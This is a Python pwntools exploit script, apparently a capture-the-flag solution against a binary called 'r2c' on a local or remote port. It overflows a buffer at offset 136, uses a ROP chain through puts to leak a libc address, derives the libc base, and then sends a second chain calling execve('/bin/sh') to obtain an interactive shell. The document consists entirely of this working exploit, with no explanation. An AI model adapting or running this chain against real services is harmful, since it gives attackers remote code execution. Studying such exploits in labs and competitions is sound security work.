from pwn import *

# Definitions
e = context.binary = ELF('./r2c',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
context.terminal = ["gnome-terminal", "-e"]


host = args.HOST or 'localhost'
port = int(args.PORT or 1024)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return process("./r2c_patched")
    else:
        return start_remote(argv, *a, **kw)

        
gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
off = 136
rop_r2c = ROP(e)

rop = off*b'A'
rop += p64(rop_r2c.rdi.address) # pop rdi; ret
rop += p64(e.got['puts'])
rop += p64(e.plt['puts']) # puts@plt
rop += p64(e.sym['main'])

io.recvrepeat(0.03)
io.sendline(rop)
io.recvline()
leak = u64(io.recv()[:6].ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']
log.success('Libc: ' + hex(libc.address))

libc_rop = ROP(libc)
libc_rop.execve(next(libc.search(b'/bin/sh')), 0, 0)
rop = off*b'A'
rop += libc_rop.chain()

io.sendline(rop)

io.interactive()